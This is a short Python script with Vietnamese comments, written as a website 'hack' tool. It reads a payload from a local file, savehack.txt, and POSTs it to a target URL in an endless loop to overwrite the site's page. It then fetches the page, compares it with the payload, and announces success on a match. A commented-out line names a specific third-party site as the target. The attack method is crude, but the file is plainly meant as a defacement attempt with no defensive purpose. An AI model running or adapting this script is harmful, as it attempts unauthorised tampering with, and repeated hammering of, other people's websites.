import requests
import time
import os

def load_payload():
    with open("savehack.txt", "r", encoding="utf-8") as f:
        return f.read()

def run_attack(target_url):
    # Lấy nội dung bạn đã sửa trong savehack.txt
    my_code = load_payload()
    
    print(f"[*] Đang thực hiện tiêm toàn bộ nội dung từ savehack.txt...")
    
    while True:
        try:
            # 1. Tấn công tiêm code
            # Giả sử tool gửi POST để ghi đè hoặc chèn vào file index
            requests.post(target_url, data={'content': my_code}, timeout=5)

            # 2. Lấy code thực tế hiện tại của Web để so sánh
            current_web_code = requests.get(target_url, timeout=5).text

            # 3. SO SÁNH TUYỆT ĐỐI
            if my_code.strip() == current_web_code.strip():
                print("\n[██████████] 100% - HACK THÀNH CÔNG!")
                print("[✓] Web mục tiêu hiện đã giống hệt file savehack.txt của bạn.")
                break
            else:
                print("[!] Code vẫn chưa khớp. Đang tiếp tục đẩy dữ liệu...", end='\r')
                
            time.sleep(1) # Nghỉ để tránh lag máy
        except Exception as e:
            print(f"[!] Lỗi kết nối: {e}. Đang thử lại...")
            time.sleep(2)

# Chạy tool
# run_attack("https://robuxviet.com")
